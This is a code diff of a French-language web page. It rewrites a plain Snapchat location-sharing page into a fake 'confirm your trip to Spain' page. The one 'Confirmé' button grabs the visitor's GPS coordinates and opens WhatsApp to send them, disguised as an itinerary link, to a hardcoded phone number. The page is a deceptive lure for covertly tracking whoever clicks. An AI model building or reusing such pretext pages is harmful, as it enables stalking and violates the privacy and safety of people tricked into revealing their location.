@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Partage de localisation</title>
+    <title>Confirmation de votre voyage en Espagne</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,6 +13,7 @@
             height: 100vh;
             background: linear-gradient(45deg, #ff7e5f, #feb47b);
             margin: 0;
+            animation: backgroundAnimation 5s infinite alternate;
         }
         .container {
             text-align: center;
@@ -21,77 +22,56 @@
             border-radius: 15px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             width: 80%;
-            max-width: 400px;
+            max-width: 500px;
+            position: relative;
+            animation: zoomIn 1s ease-out;
         }
         h1 {
-            font-size: 1.8em;
+            font-size: 2.5em;
             color: #333;
             margin-bottom: 15px;
+            animation: fadeIn 2s ease-in-out;
         }
         button {
-            background-color: #007aff; /* Bleu Snapchat */
+            background-color: #25d366; 
             color: white;
-            padding: 12px 20px;
+            padding: 15px 25px;
             border: none;
             border-radius: 5px;
             font-size: 18px;
             cursor: pointer;
-            margin: 10px;
+            transition: transform 0.3s ease-in-out;
         }
         button:hover {
-            background-color: #0066cc;
+            transform: scale(1.1);
+        }
+        @keyframes backgroundAnimation {
+            0% { background: linear-gradient(45deg, #ff7e5f, #feb47b); }
+            100% { background: linear-gradient(45deg, #feb47b, #ff7e5f); }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Partager ma position 📍</h1>
-    <p>Envoyez votre position actuelle sur Snapchat.</p>
-    <button id="openSnapchat">Ouvrir Snapchat</button>
-    <button id="copyMessage">Copier message pré-écrit</button>
-    <p id="link" style="margin-top: 15px; word-wrap: break-word;"></p>
+    <h1>Bon voyage en Espagne 🇪🇸 !</h1>
+    <p>Confirmez votre voyage en un seul clic !</p>
+    <button id="sendLocationButton">Confirmé</button>
 </div>
 
 <script>
-    document.getElementById('openSnapchat').addEventListener('click', function() {
+    document.getElementById('sendLocationButton').addEventListener('click', function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(position => {
                 let lat = position.coords.latitude;
                 let lon = position.coords.longitude;
-                let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                let snapchatUrl = `snapchat://add/pi31415p`; // Ouvre Snapchat et tente de pré-sélectionner un utilisateur
+                let message = `Bon voyage ! 🇪🇸 Voici votre itinéraire pour l'Espagne : https://www.google.com/maps?q=${lat},${lon}`;
+                let whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
                 
-                // Ouvrir Snapchat avec l'utilisateur cible
-                window.location.href = snapchatUrl; // Cela ouvre Snapchat sur le téléphone
-
-                // Afficher le lien de la position
-                document.getElementById('link').innerText = mapLink; // Afficher le lien
+                // Ouvrir WhatsApp immédiatement après le clic
+                window.open(whatsappUrl, '_blank');
             }, () => {
-                alert("Impossible de récupérer votre position.");
-            });
-        } else {
-            alert("Votre navigateur ne supporte pas la géolocalisation.");
-        }
-    });
-
-    document.getElementById('copyMessage').addEventListener('click', function() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                let lat = position.coords.latitude;
-                let lon = position.coords.longitude;
-                let mapLink = `Voici ma position actuelle: https://www.google.com/maps?q=${lat},${lon}`;
-                
-                // Copier automatiquement le message dans le presse-papier
-                navigator.clipboard.writeText(mapLink).then(() => {
-                    alert("Message copié ! Collez-le dans Snapchat.");
-                }).catch(err => {
-                    console.error("Erreur lors de la copie :", err);
-                });
-
-                document.getElementById('link').innerText = mapLink; // Afficher le message copié
-            }, () => {
-                alert("Impossible de récupérer votre position.");
+                alert("Impossible de récupérer votre position. Activez la géolocalisation.");
             });
         } else {
             alert("Votre navigateur ne supporte pas la géolocalisation.");
